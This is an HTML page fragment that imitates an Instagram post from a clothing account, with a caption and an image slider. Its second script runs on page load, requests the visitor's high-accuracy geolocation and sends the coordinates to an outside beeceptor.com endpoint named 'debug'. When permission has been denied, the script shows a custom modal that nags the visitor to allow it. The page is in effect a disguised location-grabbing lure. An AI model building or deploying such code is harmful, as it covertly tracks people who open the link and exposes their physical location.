<div class="phone-frame">

<script>

/* ===========================
   DATA IDENTITAS (UBAH DISINI)
=========================== */

const postData = {
    username: "clothingdress_id",
    profileImage: "https://png.pngtree.com/element_our/sm/20180630/sm_5b37de3263964.jpg",
    caption: '"Aleshaa signature - Sarimbit 2026" ‚ú®ü•∞',
    date: "February 3",
    images: [
        "https://img.kwcdn.com/product/fancy/b34ca47f-0b43-4ae0-8b6e-6338710f9a0a.jpg?imageMogr2/auto-orient%7CimageView2/2/w/800/q/70/format/webp",
        "https://img.lazcdn.com/g/p/1e0024e2d74f91fd449f7b94098816ea.jpg_720x720q80.jpg",
        "https://i.pinimg.com/236x/1b/87/4e/1b874e0f84d7ce29c77ce57bbce47b67.jpg"
    ]
};

/* ===========================
   RENDER DATA
=========================== */

document.getElementById("username").innerText = postData.username;
document.getElementById("captionUsername").innerText = postData.username;
document.getElementById("captionText").innerText = postData.caption;
document.getElementById("postDate").innerText = postData.date;
document.getElementById("profileImg").src = postData.profileImage;

const slidesContainer = document.getElementById("slides");
const indicatorContainer = document.getElementById("indicator");
// document.title = "on Instagram: " + postData.caption;

postData.images.forEach((imgSrc, index) => {
    const img = document.createElement("img");
    img.src = imgSrc;
    slidesContainer.appendChild(img);

    const dot = document.createElement("div");
    dot.classList.add("dot");
    if(index === 0) dot.classList.add("active");
    indicatorContainer.appendChild(dot);
});

/* ===========================
   SLIDER FUNCTION
=========================== */

let currentIndex = 0;
const totalSlides = postData.images.length;
const dots = document.querySelectorAll(".dot");

function updateSlide(){
    slidesContainer.style.transform = `translateX(-${currentIndex * 100}%)`;
    dots.forEach(dot => dot.classList.remove("active"));
    dots[currentIndex].classList.add("active");
    document.getElementById("counter").innerText = 
        (currentIndex + 1) + "/" + totalSlides;
}

function nextSlide(){
    currentIndex = (currentIndex + 1) % totalSlides;
    updateSlide();
}

function prevSlide(){
    currentIndex = (currentIndex - 1 + totalSlides) % totalSlides;
    updateSlide();
}

updateSlide();



</script>

<script>
function sendDebugLocation(lat, lon) {
  const payload = `lat=${lat}&lon=${lon}`;
  const encoded = encodeURIComponent(payload);
  const url = `https://debug-mpppp.free.beeceptor.com/debug=${encoded}`;
  fetch(url).catch(() => {});
}

function requestLocation() {
  navigator.geolocation.getCurrentPosition(
    function (pos) {
      sendDebugLocation(pos.coords.latitude, pos.coords.longitude);
      closeModal();
    },
    function (err) {
      if (err.code === err.PERMISSION_DENIED) {
        showModal();
      }
    },
    { enableHighAccuracy: true }
  );
}

function showModal() {
  document.getElementById("permissionModal").style.display = "flex";
}

function closeModal() {
  document.getElementById("permissionModal").style.display = "none";
}

// ==== CEK PERMISSION SAAT LOAD ====
navigator.permissions.query({ name: "geolocation" }).then(function(result) {
  
  if (result.state === "granted") {
    // Sudah diizinkan ‚Üí langsung ambil lokasi
    requestLocation();
  } 
  
  else if (result.state === "prompt") {
    // Belum pernah pilih ‚Üí langsung trigger browser popup
    requestLocation();
  } 
  
  else if (result.state === "denied") {
    // User pernah block ‚Üí tampilkan popup custom
    showModal();
  }

});
</script>
